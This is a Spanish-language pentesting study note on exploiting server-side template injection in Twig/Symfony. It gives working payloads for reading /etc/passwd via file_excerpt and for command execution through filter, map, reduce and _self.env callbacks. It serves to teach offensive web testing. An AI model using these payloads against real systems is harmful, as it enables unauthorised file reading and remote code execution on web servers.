---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Server-Side/SSTI
Fecha de actualización: 2026-06-22
Nota previa: "[[02 - Explotación de SSTI - Jinja2]]"
Nota siguiente: "[[04 - Evasión de filtros y sandbox en SSTI]]"
Area: "[[SSTI.base|SSTI]]"
---
---

**Twig** es el motor de plantillas de PHP (el que usa el framework `Symfony`). El recorrido es el mismo que en [[02 - Explotación de SSTI - Jinja2|Jinja2]] —fuga de información → LFI → RCE—, pero la sintaxis y las funciones cambian: aquí ejecutamos **PHP**, no Python. <mark style="background: #ADCCFFA6;">La idea de fondo es idéntica; lo que cambia es el catálogo de funciones del motor.</mark>

# Fuga de información

Twig expone mucho menos que Jinja2. El keyword `_self` da algo de contexto sobre la plantilla actual:

```twig
{{ _self }}
```

Es información limitada comparada con el `{{ config.items() }}` de Jinja2 —Twig no entrega la configuración tan fácilmente—, pero confirma la ejecución y el motor.

# Local File Inclusion (LFI)

Twig **no** trae una función interna directa para leer ficheros (sin recurrir al método de RCE). Pero `Symfony` añade [filtros propios](https://symfony.com/doc/current/reference/twig_reference.html), y uno de ellos, `file_excerpt`, lee ficheros locales:

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

<mark style="background: #FFB8EBA6;">`file_excerpt` viene de la `CodeExtension` de Symfony</mark> (parte del profiler/WebProfilerBundle): habitual en **entornos de desarrollo/debug**, pero **no** en producción endurecida. Cuando no está, la lectura de ficheros se hace vía el propio payload de RCE: `{{ ['cat /etc/passwd']|filter('system') }}`.

# Remote Code Execution (RCE)

La vía a RCE explota que las funciones de array de Twig (`filter`, `map`, `sort`, `reduce`) aceptan un **callback PHP**. Pasando `system` como callback y el comando como dato:

```twig
{{ ['id'] | filter('system') }}
```

`filter` aplica `system` a cada elemento del array → ejecuta `system('id')`. <mark style="background: #8000E1A6;">Es RCE como el usuario del servidor web</mark> (`www-data`). Variantes (`map` y `reduce` son las fiables; `sort` pasa **dos** argumentos al callback —comparación— y no siempre rinde):

```twig
{{ ['id'] | map('system') }}
{{ ['id'] | reduce('system') }}
```

> [!warning]+ Depende del sandbox de Twig
> Estos payloads funcionan con el sandbox **desactivado** (lo común si la app no lo activó). Con el `SandboxPolicy` global activo y Twig parcheado (post-`CVE-2022-23614`), pasar `'system'` como *string-callback* falla —se exige un `Closure`—; ahí hay que recurrir a [[04 - Evasión de filtros y sandbox en SSTI|bypasses del sandbox]].

En Twig **1.x**, otra vía conocida usa `_self.env`:

```twig
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

# La sintaxis cambia, el método no

<mark style="background: #FFB86CA6;">Explotar un motor que no conoces es, casi siempre, leer su documentación</mark>: buscar cómo accede a objetos/funciones del lenguaje y qué primitivas dan ejecución. Los conceptos (fuga → lectura → RCE vía una función del lenguaje host) se trasladan a Freemarker, Velocity, Smarty, Mako, ERB… Para no partir de cero, las *cheat sheets* recopilan payloads por motor —la de referencia es [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)—.

> [!info]+ Fuentes
> - [Twig reference (Symfony)](https://symfony.com/doc/current/reference/twig_reference.html) · [HackTricks — Twig SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
> - [PayloadsAllTheThings — SSTI (Twig)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig)

Tanto en Jinja2 como en Twig, en producción chocaremos con *sandboxes* del motor y filtros de caracteres. Sortearlos es la [[04 - Evasión de filtros y sandbox en SSTI]].
